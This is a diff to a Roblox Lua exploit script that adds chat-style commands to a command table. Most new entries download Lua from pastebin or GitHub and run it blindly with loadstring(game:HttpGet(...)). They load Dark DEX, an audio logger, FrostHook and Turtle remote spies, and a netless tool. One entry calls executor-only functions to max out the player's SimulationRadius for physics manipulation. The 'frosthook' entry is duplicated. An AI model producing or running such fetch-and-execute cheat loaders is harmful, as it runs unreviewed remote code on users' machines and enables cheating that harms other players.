@@ -834,6 +834,51 @@ local function BDCT_fake_script()
 				end
 			end,
 			desc = "Gets your FPS"
+		},
+		["dex"] = {
+			function()
+				loadstring(game:HttpGetAsync("https://pastebin.com/raw/iuQPQq4M"))()
+			end,
+			desc = "Loads Dark DEX"
+		},
+		["audiologger"] = {
+			function()
+				loadstring(game:HttpGet('https://pastebin.com/raw/v7Usg709', true))()
+			end,
+			desc = "Loads audio logger"
+		},
+		["frosthook"] = {
+			function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Nootchtai/FrostHook_Spy/master/Spy.lua"))()
+			end,
+			desc = "Loads frost hook"
+		},
+		["frosthook"] = {
+			function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Nootchtai/FrostHook_Spy/master/Spy.lua"))()
+			end,
+			desc = "Loads frost hook"
+		},
+		["turtlespy"] = {
+			function()
+				loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
+			end,
+			desc = "Loads turtle spy"
+		},
+		["netless"] = {
+			function()
+				loadstring(game:HttpGet("https://pastebin.com/raw/Kc5Wpt9s", true))()
+			end,
+			desc = "Loads simple netless"
+		},
+		["simradius"] = {
+			function()
+				sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
+				settings().Physics.AllowSleep = false
+  					if setfflag then setfflag("PlayerNoAccessRadius","False")
+				end
+			end,
+			desc = "Maxes out simradius"
 		}
 	}
 	
